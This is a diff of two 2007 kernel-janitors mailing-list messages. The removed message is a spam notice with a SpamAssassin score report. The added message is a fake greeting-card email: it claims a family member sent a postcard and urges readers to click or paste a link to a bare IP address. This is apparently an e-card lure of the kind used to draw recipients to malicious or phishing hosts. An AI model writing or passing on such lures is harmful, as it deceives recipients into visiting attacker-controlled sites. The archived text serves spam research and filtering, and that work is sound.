@@ -1,57 +1,44 @@
-From: "Copeland N. Rudolph" <gjl@emmbi.com>
-Date: Mon, 30 Jul 2007 12:03:59 +0000
-Subject: [KJ] alert
-Message-Id: <46ADD3AF.8000202@emmbi.com>
-MIME-Version: 1
-Content-Type: multipart/mixed; boundary="------------030701070007080406030705"
+From: "riversongs.Com" <dcb@net1plus.com>
+Date: Wed, 04 Jul 2007 11:31:54 +0000
+Subject: [KJ] Fourth of July Party
+Message-Id: <000f01c7be2e$ec00b1b0$47931b60@ayg.vx>
 List-Id: <kernel-janitors.vger.kernel.org>
+MIME-Version: 1.0
+Content-Type: text/plain; charset="us-ascii"
+Content-Transfer-Encoding: 7bit
 To: kernel-janitors@vger.kernel.org
 
+Hi. Family member has sent you a postcard.
+See your card as often as you wish during the next 15 days.
 
---------------030701070007080406030705
-Content-Type: text/plain; charset=windows-1250; format=flowed
-Content-Transfer-Encoding: 7bit
-Content-Disposition: inline
+SEEING YOUR CARD
 
+If your email software creates links to Web pages, click on your 
+card's direct www address below while you are connected to the Internet:
 
+http://72.229.228.213/?36727482ac12896caca4
 
---------------030701070007080406030705
-Content-Type: text/plain; name="SpamAssassinReport.txt"
-Content-Disposition: inline; filename="SpamAssassinReport.txt"
-Content-Transfer-Encoding: 7bit
-MIME-Version: 1.0
-X-Mailer: MIME-tools 5.419 (Entity 5.419)
-
-Spam detection software, running on the system "daredevil.linux-foundation.org", has
-identified this incoming email as possible spam.  The original message
-has been attached to this so you can view it (if it isn't spam) or label
-similar future email.  If you have any questions, see
-the administrator of that system for details.
-
-Content preview:  [...] 
-
-Content analysis details:   (5.3 points, 5.0 required)
-
- pts rule name              description
----- ---------------------- --------------------------------------------------
- 1.8 RCVD_ILLEGAL_IP        Received: contains illegal IP address
- 3.5 BAYES_99               BODY: Bayesian spam probability is 99 to 100%
-                            [score: 0.9994]
+Or copy and paste it into your browser's "Location" box (where Internet 
+addresses go).
+     
 
 
+PRIVACY
+riversongs.Com honors your privacy. Our home page and Card Pick Up have links to our 
+Privacy Policy.
 
---------------030701070007080406030705
-Content-Type: text/plain; charset="us-ascii"
-MIME-Version: 1.0
-Content-Transfer-Encoding: 7bit
-Content-Disposition: inline
+TERMS OF USE
+By accessing your card you agree we have no liability. 
+If you don't know the person sending the card or don't wish to see the card, 
+please disregard this Announcement.
+
+We hope you enjoy your awesome card.
+
+Wishing you the best,
+Postmaster,
+riversongs.Com
 
 _______________________________________________
-REMINDER: this mailing list moved to vger.kernel.org and current one will be discontinued soon.
-To resubscribe, send email to majordomo@vger.kernel.org with
-&quot;subscribe kernel-janitors&quot; in message body and follow instructions.
-
 Kernel-janitors mailing list
 Kernel-janitors@lists.linux-foundation.org
 https://lists.linux-foundation.org/mailman/listinfo/kernel-janitors
---------------030701070007080406030705--
